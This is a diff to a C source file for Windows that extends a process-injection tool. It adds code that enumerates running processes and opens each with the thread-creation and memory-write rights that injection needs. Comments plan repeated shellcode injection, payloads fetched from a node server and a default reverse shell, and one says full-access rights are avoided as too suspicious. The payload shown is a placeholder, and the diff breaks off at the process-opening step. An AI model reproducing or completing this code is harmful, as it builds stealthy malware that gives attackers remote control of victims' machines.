@@ -1,36 +1,86 @@
-#include <windows.h>
-#include <stdio.h>
-#include <psapi.h>
 
+#include "PI.h"
+
+
+void	printListInfos(t_list_infos *list) {
+	t_pinfo	*head_tmp = list->head;
+	while (head_tmp) {
+		printf("processId: %d, handleAddress: 0x%p\n", head_tmp->pid, head_tmp->HProcess);
+		head_tmp = head_tmp->next;
+	}
+}
+
+
+t_list_infos	*getProcessesList() {
+	int ownPid = _getpid();
+
+
+
+	size_t lpidProcessSize = 1024;
+	DWORD *lpidProcesses = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
+	DWORD processesReturned;
+
+	if (!EnumProcesses(lpidProcesses, sizeof(DWORD) * 1024, &processesReturned)) {
+		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
+		free(lpidProcesses);
+		return NULL;
+	}
+
+	int jumper = -1;
+	int usefullProcesses = 0;
+	t_list_infos *listInfos = (t_list_infos*)malloc(sizeof(t_list_infos));
+	t_pinfo *processInfo;
+	listInfos->head = NULL;
+	listInfos->tail = NULL;
+	while (++jumper < processesReturned / sizeof(DWORD)) {
+		// better safe than sorry :)
+		if (lpidProcesses[jumper] && lpidProcesses[jumper] != ownPid) {
+			HANDLE HProcess;
+
+			if (!(HProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, FALSE, lpidProcesses[jumper])))
+				continue;
+			processInfo = (t_pinfo*)malloc(sizeof(t_pinfo));
+			processInfo->pid = lpidProcesses[jumper];
+			processInfo->HProcess = HProcess;
+			processInfo->next = NULL;
+
+			if (!listInfos->head && !listInfos->tail) {
+				listInfos->head = processInfo;
+				listInfos->tail = processInfo;
+			}
+			listInfos->tail->next = processInfo;
+			listInfos->tail = processInfo;
+
+		}
+	}
+
+	return listInfos;
+}
 
 int		main(int argc, char** argv) {
 
 
-	// trying to fix this part to get list of processes, the psapi.a somehow is not linked !
-	size_t lpidProcessSize = 1024;
-	DWORD *lpidProcess = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
-	DWORD processesReturned;
+	t_list_infos *currentProcessesList;
+	while (!(currentProcessesList = getProcessesList()));
 
-	if (!EnumProcesses(lpidProcess, sizeof(DWORD) * 1024, &processesReturned)) {
-		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
-		free(lpidProcess);
-		return EXIT_FAILURE;
-	}
-
+	printListInfos(currentProcessesList);
 
 	return EXIT_SUCCESS;
 
-	/* This part is working where we inject a process with payload code,
-	 * but now we need to fetch all processes we have running, and hook to ones that we are allowed too
-	 */
+	// now we get list of all process we can go throught it and try to inject untill we succed, but
+	// when we inject we need to monitor that process so when it dies, we get another snapshot and we repeat.
+	// also the payload should no be static so i need to find a way to send the shellcode from node server or something.
+	// and trigger another snapshot and injection, but by default a reverse shell will do !
 
 	char *payload = "\x69\x69";
-	size_t payloadSize = sizeof(payload); 
+	size_t payloadSize = sizeof(payload);
 
 
 	HANDLE HProcess = NULL;
 	int pid = atoi(argv[1]);
 
+	// PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION
+	// Need to use the above permissions ! ALL_ACCESS is to suspecious.
 	if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
 		printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
 		return EXIT_FAILURE;
